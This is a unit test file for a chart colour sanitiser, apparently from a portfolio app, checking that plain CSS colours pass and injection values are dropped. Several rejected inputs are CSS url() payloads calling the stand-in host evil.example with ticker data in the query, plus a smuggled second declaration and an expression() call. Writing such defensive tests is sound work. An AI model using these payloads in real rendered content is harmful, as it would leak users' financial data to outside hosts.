import { describe, expect, it } from "vitest";
import { safeChartColor, sanitizeChartColors } from "./chartColor";

describe("safeChartColor", () => {
  it.each([
    "#fff",
    "#1a2b3c",
    "#1a2b3c80",
    "rgb(10, 20, 30)",
    "rgba(10,20,30,0.5)",
    "hsl(120 50% 40% / 0.3)",
    "var(--color-bull)",
    "steelblue",
    "  #abc  ",
  ])("keeps a plain colour: %s", (c) => {
    expect(safeChartColor(c)).toBe(c.trim());
  });

  it.each([
    "url(https://evil.example/?d=AAPL:10:150)",
    "url('https://evil.example/x.png')",
    "red url(https://evil.example/)",
    "image-set(url(https://evil.example/a.png) 1x)",
    "var(--x, url(https://evil.example/))",
    "rgb(1,2,3) url(https://evil.example/)",
    "expression(alert(1))",
    "#fff; background:url(https://evil.example/)",
    "",
  ])("drops anything that is not plainly a colour: %s", (c) => {
    expect(safeChartColor(c)).toBeUndefined();
  });

  it("drops non-strings", () => {
    expect(safeChartColor(123)).toBeUndefined();
    expect(safeChartColor({ toString: () => "red" })).toBeUndefined();
    expect(safeChartColor(null)).toBeUndefined();
  });
});

describe("sanitizeChartColors", () => {
  it("sanitises data and series colours and keeps everything else", () => {
    const chart = {
      type: "donut",
      data: [
        { name: "AAPL", value: 40, color: "url(https://evil.example/?h=AAPL)" },
        { name: "MSFT", value: 60, color: "#0af" },
      ],
      series: [{ key: "value", color: "url(https://evil.example/s)", label: "Weight" }],
    };
    const out = sanitizeChartColors(chart);
    expect(out.data).toEqual([
      { name: "AAPL", value: 40, color: undefined },
      { name: "MSFT", value: 60, color: "#0af" },
    ]);
    expect(out.series).toEqual([{ key: "value", color: undefined, label: "Weight" }]);
    expect(out.type).toBe("donut");
  });

  it("leaves a chart without series alone", () => {
    const chart: { data: { color?: unknown }[]; series?: { color?: unknown }[] } = { data: [] };
    expect(sanitizeChartColors(chart).series).toBeUndefined();
  });
});
